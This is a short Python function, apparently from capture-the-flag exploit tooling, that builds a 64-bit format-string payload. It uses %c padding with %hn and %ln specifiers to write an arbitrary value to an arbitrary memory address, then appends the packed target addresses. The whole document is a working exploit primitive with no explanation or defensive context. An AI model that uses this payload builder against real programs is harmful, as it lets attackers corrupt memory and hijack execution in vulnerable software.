def fmt64(offset, addr, value, b=3):
    payload = ''
    prev = 0

    if value == 0:
        payload += '%{}$ln'.format(offset + 1)
        payload += 'A' * ((8 - len(payload) % 8) % 8)
        payload += p64(addr)
        return payload

    for i in range(b):
        target = (value >> (i * 16)) & 0xffff
        
        if prev < target:
            payload += '%{}c'.format(target - prev)
        elif prev > target:
            payload += '%{}c'.format(0x10000 + target - prev)

        payload += '%xx$hn'
        prev = target

    payload += 'A' * ((8 - len(payload) % 8) % 8)

    for i in range(b):
        idx = payload.find("%xx$hn")
        off = offset + (len(payload) / 8) + i
        payload = payload[:idx] + '%{}$hn'.format(off) + payload[idx+6:]

    payload += 'A' * ((8 - len(payload) % 8) % 8)

    for i in range(b):
        payload += p64(addr + i * 2)
    
    return payload